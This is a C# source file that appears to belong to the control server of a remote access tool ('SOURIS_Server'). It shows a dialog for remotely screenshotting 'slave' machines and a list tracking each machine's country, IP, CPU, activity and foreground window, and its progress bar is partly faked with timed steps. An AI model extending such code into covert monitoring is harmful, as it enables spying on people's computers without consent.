using MahApps.Metro.Controls.Dialogs;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Threading;

namespace SOURIS_Server.Form
{
    class FormUpdate
    {
        public static BackgroundWorker Screenshotworker = new BackgroundWorker();
        public static void initBackGroundWorker()
        {
            Screenshotworker.DoWork += Screenshotworker_DoWork;
        }

        private static async void Screenshotworker_DoWork(object sender, DoWorkEventArgs e)
        {
            var controller = await MainWindow.main.ShowProgressAsync("Screenshooting Slave...", "Sending a request to the slave...");
            while (Sockets.SocketServer.WaitForInteract)
            {
                Task.Delay(500).Wait() ;
            }
            controller.SetProgress(40);
            controller.SetMessage("Send done. Waiting for the screenshot...");
            while (Sockets.TCPServer.waitingforscreenshot)
            {
                Task.Delay(500).Wait();
            }
            controller.SetProgress(80);
            controller.SetMessage("Receiving screenshot...");
            Task.Delay(500).Wait();
            controller.SetProgress(81);
            Task.Delay(500).Wait();
            controller.SetProgress(82);
            Task.Delay(500).Wait();
            controller.SetProgress(84);
            Task.Delay(500).Wait();
            controller.SetProgress(88);
            Task.Delay(500).Wait();
            controller.SetProgress(90);
            Task.Delay(500).Wait();
            controller.SetProgress(91);
            Task.Delay(500).Wait();
            controller.SetProgress(95);
            Task.Delay(500).Wait();
            controller.SetProgress(96);
            Task.Delay(500).Wait();
            controller.SetProgress(97);
            Task.Delay(500).Wait();
            controller.SetProgress(99);
            Task.Delay(500).Wait();
            controller.SetProgress(100);
        }

        public async static void ShowDialog(string title, string message)
        {
            await Application.Current.Dispatcher.BeginInvoke(DispatcherPriority.Background, new Action(async () => await MainWindow.main.ShowMessageAsync(title, message)));
        }
        public static void addlistbox(string message)
        {
            Application.Current.Dispatcher.BeginInvoke(DispatcherPriority.Background, new Action(() => MainWindow.main.listBox.Items.Add(message)));
        }
        public static void startingtask()
        {
            addlistbox(" >> Server Started");
            Application.Current.Dispatcher.BeginInvoke(DispatcherPriority.Background, new Action(() => MainWindow.main.listView1.ItemsSource = Slaves.SlaveList.List));
            Application.Current.Dispatcher.BeginInvoke(DispatcherPriority.Background, new Action(() => MainWindow.main.listView1.Items.Refresh()));
            initBackGroundWorker();
        }
        public static void deleteline()
        {
            int intselectedindex = MainWindow.main.listView1.SelectedIndex;
            try
            {
                if (MainWindow.main.listView1.SelectedItems.Count > 0)
                {
                    int selected = MainWindow.main.listView1.SelectedIndex;
                    Slaves.SlaveList.List.RemoveAt(selected);
                    MainWindow.main.listView1.Items.Refresh();
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString());
            }
        }

        internal static void updateSlave(string content)
        {
            string[] SlaveContent = content.Split('|');
            bool updated = false;
            for (int i = 0; i < Slaves.SlaveList.List.Count; i++)
            {
                if (Slaves.SlaveList.List[i].Name.Contains(SlaveContent[0]))
                {
                    updated = true;
                    Slaves.SlaveList.List[i].Name = SlaveContent[0];
                    Slaves.SlaveList.List[i].Country = SlaveContent[1];
                    Slaves.SlaveList.List[i].Ping = SlaveContent[2];
                    Slaves.SlaveList.List[i].CPU = SlaveContent[3];
                    Slaves.SlaveList.List[i].RAM = SlaveContent[4];
                    Slaves.SlaveList.List[i].Activity = SlaveContent[5];
                    Slaves.SlaveList.List[i].Front = SlaveContent[6];
                    Slaves.SlaveList.List[i].IP = SlaveContent[7];
                    break;
                }
            }
            if (!updated)
            {
                Application.Current.Dispatcher.BeginInvoke(DispatcherPriority.Background, new Action(() => Slaves.SlaveList.List.Add(new Slaves.SlaveList.Slave { Name = SlaveContent[0], Country = SlaveContent[1], Ping = SlaveContent[2], CPU = SlaveContent[3], RAM = SlaveContent[4], Activity = SlaveContent[5], Front = SlaveContent[6], IP = SlaveContent[7] }) ));
            }
            Application.Current.Dispatcher.BeginInvoke(DispatcherPriority.Background, new Action(() => MainWindow.main.listView1.Items.Refresh()));
        }
        
    }
}
